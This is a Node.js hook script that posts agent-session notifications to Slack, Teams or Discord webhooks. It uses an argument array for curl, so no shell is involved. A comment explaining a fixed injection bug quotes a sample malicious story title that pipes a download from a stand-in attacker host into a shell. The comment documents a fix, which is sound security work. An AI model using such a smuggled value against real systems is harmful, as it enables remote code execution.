#!/usr/bin/env node
// notifier.js — Stop hook
// Fires configurable webhooks for session events
// Exit 0 always

const fs = require('fs');
const path = require('path');
// execFileSync, never execSync: the webhook body is assembled from STATE.md, which agents
// write. A command STRING goes through a shell; an argv array does not.
const { execFileSync } = require('child_process');

const CONFIG_PATH = path.join(process.cwd(), '.planning', 'config.yaml');
const HEALTH_PATH = path.join(process.cwd(), '.planning', 'context-health.json');
const STATE_PATH = path.join(process.cwd(), '.planning', 'STATE.md');
const NOTIFY_CONFIG_PATH = path.join(process.cwd(), '.planning', 'notifications.json');

async function main() {
  try {
    // Load notification config
    if (!fs.existsSync(NOTIFY_CONFIG_PATH)) process.exit(0);

    const config = JSON.parse(fs.readFileSync(NOTIFY_CONFIG_PATH, 'utf8'));
    if (!config.enabled || !config.webhook_url) process.exit(0);

    // Gather session data
    const sessionData = gatherSessionData();
    if (!sessionData) process.exit(0);

    // Determine which events to notify on
    const events = config.events || ['session_end'];
    const notifications = [];

    // Always notify on session end if configured
    if (events.includes('session_end')) {
      notifications.push({
        event: 'session_end',
        summary: formatSessionSummary(sessionData)
      });
    }

    // Check for phase completion
    if (events.includes('phase_complete') && sessionData.phaseChanged) {
      notifications.push({
        event: 'phase_complete',
        summary: `Phase completed: ${sessionData.phase}`
      });
    }

    // Check for security findings
    if (events.includes('security_finding')) {
      const securityDir = path.join(process.cwd(), '.planning', 'security');
      if (fs.existsSync(securityDir)) {
        const findings = fs.readdirSync(securityDir)
          .filter(f => f.endsWith('.md'))
          .filter(f => {
            const content = fs.readFileSync(path.join(securityDir, f), 'utf8');
            return content.includes('critical') || content.includes('CRITICAL');
          });
        if (findings.length > 0) {
          notifications.push({
            event: 'security_finding',
            summary: `Critical security findings in: ${findings.join(', ')}`
          });
        }
      }
    }

    // Send notifications
    for (const notification of notifications) {
      sendWebhook(config.webhook_url, {
        project: sessionData.project || 'rmad',
        event: notification.event,
        agent: sessionData.agent,
        phase: sessionData.phase,
        story: sessionData.story,
        summary: notification.summary,
        timestamp: new Date().toISOString()
      }, config.format || 'slack');
    }

    process.exit(0);
  } catch (err) {
    process.exit(0);
  }
}

function gatherSessionData() {
  const data = { agent: 'unknown', phase: 'unknown', story: 'none', phaseChanged: false };

  if (fs.existsSync(STATE_PATH)) {
    const state = fs.readFileSync(STATE_PATH, 'utf8');
    const agentMatch = state.match(/- Name: (.+)/);
    const phaseMatch = state.match(/- Phase: (.+)/);
    const storyMatch = state.match(/- Story: (.+)/);
    const projectMatch = state.match(/- name: "(.+)"/);
    if (agentMatch) data.agent = agentMatch[1].trim();
    if (phaseMatch) data.phase = phaseMatch[1].trim();
    if (storyMatch) data.story = storyMatch[1].trim();
    if (projectMatch) data.project = projectMatch[1].trim();
  }

  if (fs.existsSync(HEALTH_PATH)) {
    try {
      const health = JSON.parse(fs.readFileSync(HEALTH_PATH, 'utf8'));
      data.toolCalls = health.callCount || 0;
      data.tokensEstimated = (health.session && health.session.estimatedTokens) || 0;
    } catch { /* ignore */ }
  }

  return data;
}

function formatSessionSummary(data) {
  return `Agent: ${data.agent} | Phase: ${data.phase} | Story: ${data.story} | Calls: ${data.toolCalls || 0} | ~${Math.round((data.tokensEstimated || 0) / 1000)}K tokens`;
}

function sendWebhook(url, payload, format) {
  try {
    let body;
    if (format === 'slack') {
      // Slack webhook format
      body = JSON.stringify({
        text: `*[${payload.project}]* ${payload.event}`,
        blocks: [
          {
            type: 'section',
            text: {
              type: 'mrkdwn',
              text: `*${payload.event.replace(/_/g, ' ').toUpperCase()}*\n${payload.summary}`
            }
          },
          {
            type: 'context',
            elements: [
              { type: 'mrkdwn', text: `Agent: *${payload.agent}* | Phase: *${payload.phase}* | Story: *${payload.story}*` },
              { type: 'mrkdwn', text: payload.timestamp }
            ]
          }
        ]
      });
    } else if (format === 'teams') {
      // Microsoft Teams webhook format
      body = JSON.stringify({
        '@type': 'MessageCard',
        summary: `${payload.project} — ${payload.event}`,
        sections: [{
          activityTitle: payload.event.replace(/_/g, ' ').toUpperCase(),
          facts: [
            { name: 'Agent', value: payload.agent },
            { name: 'Phase', value: payload.phase },
            { name: 'Story', value: payload.story },
            { name: 'Summary', value: payload.summary }
          ]
        }]
      });
    } else if (format === 'discord') {
      // Discord webhook format
      body = JSON.stringify({
        content: `**[${payload.project}]** ${payload.event.replace(/_/g, ' ')}`,
        embeds: [{
          title: payload.event.replace(/_/g, ' ').toUpperCase(),
          description: payload.summary,
          fields: [
            { name: 'Agent', value: payload.agent, inline: true },
            { name: 'Phase', value: payload.phase, inline: true },
            { name: 'Story', value: payload.story, inline: true }
          ],
          timestamp: payload.timestamp
        }]
      });
    } else {
      // Generic JSON
      body = JSON.stringify(payload);
    }

    // Use curl for cross-platform webhook delivery.
    //
    // The payload goes on STDIN via `-d @-`, and the argv is fixed.
    //
    // The previous form built a shell string and tried to escape the body with
    // `body.replace(/'/g, "\\'")` — but `\'` does not escape a single quote inside a
    // single-quoted POSIX string. The quote simply terminated the string and everything
    // after it ran as shell. The body is built from .planning/STATE.md, which agents
    // write, so a story title of `S-1'; curl evil.tld/x | sh; echo '` was remote code
    // execution — fired automatically at the end of every turn, with no tool gating.
    //
    // There is no escaping to get right here, because there is no shell.
    execFileSync('curl', ['-s', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '@-', url], {
      input: body,
      timeout: 10000,
      shell: false,
      windowsHide: true,
      stdio: ['pipe', 'pipe', 'pipe']
    });
  } catch {
    // Non-critical — don't block on notification failures
  }
}

main();
